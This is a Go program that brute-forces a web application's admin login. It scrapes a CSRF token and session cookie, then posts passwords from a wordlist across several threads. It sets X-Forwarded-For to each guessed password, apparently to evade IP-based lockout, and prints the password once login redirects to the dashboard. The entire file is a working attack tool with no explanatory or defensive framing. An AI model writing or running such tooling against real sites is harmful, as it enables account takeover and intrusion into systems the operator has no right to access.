package main

import (
	"bufio"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
)

func main() {
	var passwd_file string
	var username string
	var hostname string
	var thread int
	flag.StringVar(&passwd_file, "p", "", "Password file")
	flag.StringVar(&username, "u", "", "Enter username")
	flag.StringVar(&hostname, "l", "", "Hostname eg... http://127.0.0.1/admin/login.php")
	flag.IntVar(&thread, "c", 5, "Threads (default 5)")

	flag.Parse()

	passwords, _ := os.Open(passwd_file)

	scanner := bufio.NewScanner(passwords)
	check_password := make(chan string)
	var wg sync.WaitGroup

	totalRequests := 0
	for i := 0; i < thread; i++ {
		wg.Add(1)
		go func() {
			for pwd := range check_password {
				resp, err := http.Get(hostname)
				if err != nil {
					log.Fatalln(err)
				}
				body, err := ioutil.ReadAll(resp.Body)
				if err != nil {
					log.Fatalln(err)
				}
				sb := string(body)
				re := regexp.MustCompile(`input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="(.*?)"`)
				rs := re.FindStringSubmatch(sb)

				cookie_all := string(resp.Header["Set-Cookie"][0])
				cookie := strings.Split(cookie_all, ";")

				data := url.Values{}
				data.Set("username", username)
				data.Set("password", pwd)
				data.Set("tokenCSRF", rs[1])

				client := &http.Client{
					CheckRedirect: func(req *http.Request, via []*http.Request) error {
						return http.ErrUseLastResponse
					},
				}

				req, err := http.NewRequest("POST", hostname, strings.NewReader(data.Encode()))
				if err != nil {
					log.Fatalln(err)
				}
				req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
				req.Header.Add("Content-Lenght", strconv.Itoa(len(data.Encode())))
				req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0")
				req.Header.Add("Referer", hostname)
				req.Header.Add("X-Forwarded-For", pwd)
				req.Header.Add("Cookie", cookie[0])

				res, err := client.Do(req)
				if err != nil {
					log.Fatalln(err)
				}

				if res.StatusCode == 200 {
					totalRequests++
					if totalRequests%10 == 0 {
						fmt.Printf("Total requests sent: %d \n", totalRequests)
					}
				} else if res.StatusCode == 301 && res.Header["Location"][0] == "/admin/dashboard" {
					fmt.Printf("Total requests sent: %d \n", totalRequests)
					fmt.Printf("==========Password Cracked=============")
					fmt.Printf("Password: %s", pwd)
					os.Exit(0)
					break
				} else {
					log.Println("NO IDEA")
				}
			}
			wg.Done()
		}()
	}

	for scanner.Scan() {
		passwd := scanner.Text()
		check_password <- passwd
	}
	close(check_password)
	wg.Wait()
	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}

}
